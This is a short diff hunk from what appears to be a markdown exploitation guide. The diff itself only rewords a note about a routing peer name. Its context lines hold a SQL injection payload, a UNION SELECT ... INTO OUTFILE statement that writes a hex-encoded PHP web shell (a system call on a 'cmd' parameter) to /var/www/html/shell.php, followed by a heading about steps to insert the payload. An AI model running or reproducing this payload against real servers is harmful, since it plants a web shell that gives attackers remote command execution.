@@ -334,7 +334,7 @@ v0.11.0 / Alexander Hagenah / @xaitax / ah@primepage.de
 # command converted into hex decimal and write into specified path 
 " UNION SELECT 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE "/var/www/html/shell.php" -- -
 ```
-> Note: In the routing information, there is already configured peer name `ThisIsTheOne`. You can also add a new peer name using the instructions below.
+> Note: In the routing information, there is already configured peer name `ThisIsTheOne`. You can also add a new configuration using the instructions below.
 
 ## Steps to insert payload
 - Go to `settings` and enable the routing module
